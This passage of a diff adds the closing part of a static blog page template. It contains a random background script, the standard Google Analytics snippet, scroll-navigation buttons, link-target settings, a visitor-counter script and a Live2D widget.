+                var backgroundimg = "url(/background/bg-x.jpg)".replace(/x/gi, Math.ceil(Math.random() * backgroundnum));
+                $("body").css({"background": backgroundimg, "background-attachment": "fixed", "background-size": "cover"});
+            }
+        })
+    </script>
+
+
+
+<!-- Google Analytics -->
+<script type="text/javascript">
+(function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+})(window,document,'script','//www.google-analytics.com/analytics.js','ga');
+
+ga('create', '[object Object]', 'auto');
+ga('send', 'pageview');
+
+</script>
+<!-- End Google Analytics -->
+
+
+
+<div class="scroll" id="scroll">
+    <a href="#" title="返回顶部"><i class="fa fa-arrow-up"></i></a>
+    <a href="#comments" onclick="load$hide();" title="查看评论"><i class="fa fa-comments-o"></i></a>
+    <a href="#footer" title="转到底部"><i class="fa fa-arrow-down"></i></a>
+</div>
+<script>
+    // Open in New Window
+    
+        var oOpenInNew = {
+            
+            
+            
+            
+             categories: ".article-category a, a.tag-list-link", 
+            
+             archives: ".archive-article-title", 
+             miniArchives: "a.post-list-link", 
+            
+             friends: "#js-friends a", 
+             socail: ".social a" 
+        }
+        for (var x in oOpenInNew) {
+            $(oOpenInNew[x]).attr("target", "_blank");
+        }
+    
+</script>
+
+<script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js">
+</script>
+  </div>
+<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"log":false,"pluginJsPath":"lib/","pluginModelPath":"assets/","pluginRootPath":"live2dw/","tagMode":false});</script></body>
+</html>
